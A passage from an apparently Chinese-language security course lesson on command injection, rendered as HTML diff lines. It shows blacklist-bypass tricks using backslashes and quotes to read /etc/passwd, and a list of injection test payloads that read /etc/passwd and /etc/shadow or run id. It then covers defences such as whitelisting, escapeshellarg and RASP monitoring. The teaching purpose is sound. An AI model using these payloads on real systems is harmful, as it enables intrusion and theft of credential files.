+<p data-nodeid="20461"><strong data-nodeid="20662">反斜杠</strong></p>
+</li>
+</ul>
+<p data-nodeid="20462">反斜杠的作用就是转义，因此可用来拆分黑名单字符串，但又不影响结果。</p>
+<pre class="lang-java" data-nodeid="20463"><code data-language="java">c\a\t /et\c/pas\s\wd
+</code></pre>
+<ul data-nodeid="20464">
+<li data-nodeid="20465">
+<p data-nodeid="20466"><strong data-nodeid="20667">单双引号</strong></p>
+</li>
+</ul>
+<p data-nodeid="20467">单双引号内的内容会被当作字符串处理，跟其他字符串可拼接出我们需要的命令行字符串。</p>
+<pre class="lang-java" data-nodeid="20468"><code data-language="java">c<span class="hljs-string">"a"</span>t /et<span class="hljs-string">''</span>c/p<span class="hljs-string">'a'</span>sswd
+</code></pre>
+<h3 data-nodeid="20469">挖掘命令注入漏洞</h3>
+<h4 data-nodeid="20470">1.代码审计</h4>
+<p data-nodeid="20471">代码审计思路就是追踪污点（用户可控数据，如 Get、Post 数据等等）的传播，看是否未经限制就传递给命令执行函数（system、exec、shell_ exec 等等）。</p>
+<h4 data-nodeid="20472">2.黑盒扫描</h4>
+<p data-nodeid="20473">通过漏洞扫描器来检测漏洞，对用户输入参数去构造一些命令，然后检测返回结果，最常用的无害命令就是 sleep 函数，看延时情况来判断是否执行成功，无论执行结果有无回显，均可适用。</p>
+<p data-nodeid="20474">一些常用的 Linux 平台的命令注入测试用例如下：</p>
+<pre class="lang-java" data-nodeid="20475"><code data-language="java">&amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/passwd&amp;quot;--&amp;gt;
+&amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/shadow&amp;quot;--&amp;gt;
+&amp;lt;!--#exec%20cmd=&amp;quot;/usr/bin/id;--&amp;gt;
+&amp;lt;!--#exec%20cmd=&amp;quot;/usr/bin/id;--&amp;gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+……
+</code></pre>
+<p data-nodeid="20476">Windows 平台以及其他更多的测试用例可参考 <a href="https://github.com/payloadbox/command-injection-payload-list" data-nodeid="20680">command-injection-payload-list</a>。</p>
+<h3 data-nodeid="20477">漏洞防御</h3>
+<h4 data-nodeid="20478">1.代码层面的漏洞规避</h4>
+<p data-nodeid="20479">尽量不用系统命令执行函数，这是最简单粗暴的方式，但也是最有效的方式。很多方式其实是可以通过一些语言内置 API 完成，这些攻击者是无法控制 API 去执行其他预料之外的命令，除非 API 存在漏洞。</p>
+<p data-nodeid="20480">如果一定要使用命令执行函数，就尽量不要将外部可控数据作为命令行参数。</p>
+<p data-nodeid="20481">如果要将用户可控数据传递给命令执行函数，那首先推荐白名单方式，然后再是考虑转义过滤，以及数据格式校验。比如靶场题目是输入 IP 地址，那你可以使用正则做 IP 格式的检测，不符合就拒绝请求。总之，尽可能限制可输入参数的范围，比如仅允许数字或者数字字母等方式。</p>
+<blockquote data-nodeid="20482">
+<p data-nodeid="20483">转义过滤：可以使用 escapeshellcmd 函数对整个命令字符串作转义，它会在以下字符之前插入反斜线： &amp;#;\`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF，但即使如此，攻击者还是可以传入任意数量的参数，此时可以使用 escapeshellarg() 函数对单个参数进行转义。</p>
+</blockquote>
+<h4 data-nodeid="20484">2.命令执行监控与阻断</h4>
+<p data-nodeid="20485">基于命令执行函数监控，比如 PHP 环境下对 system 函数进行 hook，Java 环境下的 java.lang.Runtime.exec() 函数，当漏洞触发时可告警出来，并支持阻断功能，这就是前面课程多次提到过的 RASP 方案，准确率理论上可达到 100％。</p>
+<p data-nodeid="20486">推荐百度开源的 OpenRASP 产品，下图是其拦截 JSP 命令执行漏洞的事件截图。</p>
+<p data-nodeid="20487"><img src="https://s0.lgstatic.com/i/image2/M01/0A/AB/CgpVE2ASi3yACySBAAMVN4nSHBY967.png" alt="图片4.png" data-nodeid="20720"></p>
+<div data-nodeid="20488"><p style="text-align:center">图 4  OpenRASP 拦截命令执行</p></div>
+<h3 data-nodeid="20489">总结</h3>
+<p data-nodeid="20490">本课主要以 PHP 环境下的“命令注入”场景作为演示，介绍了命令注入漏洞的成因，以及常见的利用技巧，特别总结了些常见的限制绕过方法，最后同样讲解漏洞挖掘与防御的主流方式。</p>
+<p data-nodeid="20491">命令注入原理和利用相对比较简单，但在真实业务场景中，用户可控变量的传递往往比较复杂，并不一定那么容易发现和构造利用，往往是黑盒扫描与白盒代码审计相结合去发现，业务上线后再结合 RASP 等安全系统去监控和拦截。</p>
+<p data-nodeid="21519">WAF 在命令注入检测中有作用相对比较有限，因为有些命令就是简单字母字符串，比如 id。拦截此参数很大概率会连正常请求都阻断点，会影响正常业务功能，所以很多时候都是设法从程序运行环境、系统底层去做检测与拦截。</p>
+<hr data-nodeid="21520">
+<p data-nodeid="21521" class="te-preview-highlight"><a href="https://wj.qq.com/s2/8059116/3881/" data-nodeid="21525">课程评价入口，挑选 5 名小伙伴赠送小礼品～</a></p></div>
+
+</body></html>
